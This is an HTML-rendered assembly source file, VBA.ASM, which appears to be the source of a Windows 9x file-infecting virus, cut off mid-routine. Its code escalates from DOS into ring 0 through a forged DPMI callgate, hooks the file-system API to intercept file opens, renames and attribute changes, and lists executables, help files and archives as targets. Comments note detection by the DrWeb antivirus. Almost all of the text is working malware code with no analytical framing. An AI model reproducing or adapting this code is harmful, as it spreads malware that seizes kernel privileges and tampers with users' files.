<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>VBA.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;COMMENT /</span><span class="sc0">
</span><span class="sc1">;  (C) VBA Ltd. ALL RIGHTS RESERVED.</span><span class="sc0">
</span><span class="sc1">;  E-mail: support@vba.com.by</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT</span><span class="sc0">
</span><span class="sc1">;  MODIFICATION, ARE PERMITTED.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND</span><span class="sc0">
</span><span class="sc1">;  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span><span class="sc0">
</span><span class="sc1">;  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE</span><span class="sc0">
</span><span class="sc1">;  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE</span><span class="sc0">
</span><span class="sc1">;  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span><span class="sc0">
</span><span class="sc1">;  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS</span><span class="sc0">
</span><span class="sc1">;  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span><span class="sc0">
</span><span class="sc1">;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT</span><span class="sc0">
</span><span class="sc1">;  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY</span><span class="sc0">
</span><span class="sc1">;  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF</span><span class="sc0">
</span><span class="sc1">;  SUCH DAMAGE.</span><span class="sc0">
</span><span class="sc1">;/</span><span class="sc0">

</span><span class="sc1">; KNOWN UNFIXED BUGS:</span><span class="sc0">
</span><span class="sc1">; 1. INCORRECT PATCHED PAGE MAPPING IN SOME CASES FOR RESTORED NON-WRITEABLE</span><span class="sc0">
</span><span class="sc1">;    CODE SECTION FROM R0</span><span class="sc0">
</span><span class="sc1">; 2. DRWEB ALARM FOR PE EXECUTABLE (BUT FALSE ALARM TOO)</span><span class="sc0">

</span><span class="sc5">MODEL</span><span class="sc0"> </span><span class="sc10">TINY</span><span class="sc0">
</span><span class="sc5">P386</span><span class="sc0">
</span><span class="sc5">LOCALS</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0">     </span><span class="sc5">VBA.INC</span><span class="sc0">

</span><span class="sc5">TOTAL</span><span class="sc0">       </span><span class="sc9">GROUP</span><span class="sc0">   </span><span class="sc5">CODE16</span><span class="sc4">,</span><span class="sc5">CODE32</span><span class="sc0">

</span><span class="sc1">;======================================</span><span class="sc0">
</span><span class="sc5">CODE16</span><span class="sc0">      </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0"> </span><span class="sc9">USE16</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">TOTAL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">TOTAL</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">TOTAL</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">TOTAL</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">      

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">DOS2R0</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DOS_INSTALL</span><span class="sc0">     </span><span class="sc1">;0EBH (OR 0E9H FOR PE_INSTALL)</span><span class="sc0">
</span><span class="sc5">JMP_RELO</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">COPYRIGHT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'(C) VBA Ltd. E-mail: support@vba.com.by'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OFF_DOSINST</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">JMP_RELO</span><span class="sc0">
</span><span class="sc5">DOS_INSTALL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO2_DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">160AH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">2FH</span><span class="sc0">         </span><span class="sc1">;GET WIN VERSION</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">GOZ_DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;&lt;4.X?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO2_DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">OUR_PORT</span><span class="sc0">
        </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">WE_HERE</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GO2_DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;0-PE,1-HLP,2-RAR,3-ZIP</span><span class="sc0">
                        </span><span class="sc1">;4-ARJ,5-HA</span><span class="sc0">
</span><span class="sc5">FILE_TYPE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_DOS_SLEEP</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">1AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">DOS_SLEEP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STI</span><span class="sc0">             </span><span class="sc1">;TIMEOUT FOR HLP (PREVENT HANG)</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">1AH</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,(</span><span class="sc5">WAIT_TIME</span><span class="sc4">*</span><span class="sc2">18</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">DOS_SLEEP</span><span class="sc0">
</span><span class="sc5">NO_DOS_SLEEP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1687H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">2FH</span><span class="sc0">         </span><span class="sc1">;DPMI PRESENT (0.9 IN WIN95/8)?</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">GOZ_DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">;MALLOC FOR INTERNAL USE BY DPMI HOST</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO2_DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;GO OUT FROM V86 TO PM MODE</span><span class="sc0">
</span><span class="sc5">GO2_DOS_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO_DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALC_DOS_DELTA</span><span class="sc0">
</span><span class="sc5">DOS_DELTA</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'MS-DOS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CALC_DOS_DELTA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">168AH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">2FH</span><span class="sc0">         </span><span class="sc1">;GET EXTAPI</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc5">GOZ_DOS_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ALLOC_DESC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ALLOC_DESC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">ZERO_INIT</span><span class="sc4">-</span><span class="sc5">DOS_DELTA</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0BH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DPMICALL</span><span class="sc0">        </span><span class="sc1">;GET CS DESCRIPTOR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;GET LDT ALIAS</span><span class="sc0">
</span><span class="sc5">GO_DOS_EXIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">OFF_R0_INSTALL</span><span class="sc4">-</span><span class="sc5">DOS_DELTA</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">               </span><span class="sc1">;GENERATE CALLGATE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">11101100B</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">  </span><span class="sc1">;P=1:DPL=3:S=0:TYPE=0CH (CALLGATE)</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">;GENERATE R0 DESCRIPTOR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1100111110011010B</span><span class="sc0">    </span><span class="sc1">;G=1:32=1:AVL=0:LIMIT=0FH</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">               </span><span class="sc1">;P=1:DPL=0:S=1:CODE:NCONF:READ=1:NOACCESS</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;SWITCH TO R0</span><span class="sc0">
</span><span class="sc5">DOS_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">.EXIT</span><span class="sc0">
</span><span class="sc5">ALLOC_DESC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">DPMICALL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">31H</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">DOS_EXIT</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0">     </span><span class="sc5">SPE.ASI</span><span class="sc0">

</span><span class="sc5">END_CODE16</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">

        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;======================================</span><span class="sc0">
</span><span class="sc5">CODE32</span><span class="sc0">      </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0"> </span><span class="sc9">USE32</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">TOTAL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">TOTAL</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">TOTAL</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">TOTAL</span><span class="sc0">

</span><span class="sc5">START_CODE32</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CALC_DELTA</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALC_OUR_OFFST</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_OFFST</span><span class="sc0">
</span><span class="sc5">CALC_OUR_OFFST</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">OUR_OFFST</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OFF_IFS_HOOKER</span><span class="sc0">

</span><span class="sc1">; INT FILESYSTEMAPIHOOKFUNCTION(PIFSFUNC FSDFNADDR,INT FUNCTIONNUM,INT DRIVE,</span><span class="sc0">
</span><span class="sc1">;                               INT RESOURCEFLAGS,INT CODEPAGE,PIOREQ PIR)</span><span class="sc0">
</span><span class="sc5">IFS_HOOKER</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">FSD_FN_ADDR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FN_NUM</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DRIVE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">RES_FLAGS</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CODE_PAGE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">P_IOREQ</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">ENTERD</span><span class="sc0">  </span><span class="sc5">STACK_FRAME</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALC_DELTA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc5">P_IOREQ</span><span class="sc0">
        </span><span class="sc6">BTS</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">IFS_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">RES_FLAGS</span><span class="sc4">,</span><span class="sc5">IFSFH_RES_CFSD</span><span class="sc0"> </span><span class="sc1">;CHAR DEVICE?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IFS_RETURN</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">FN_NUM</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">IFS_RETURN</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_RENAME</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_OPEN</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_ATTRIB</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">IFS_RETURN_OFF</span><span class="sc0">
</span><span class="sc5">IFS_RETURN</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc5">LEAVED</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12345678H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OLD_IFS_HOOKER</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">IFS_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OLD_DATETIME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FSD_FN_ADDR</span><span class="sc0">
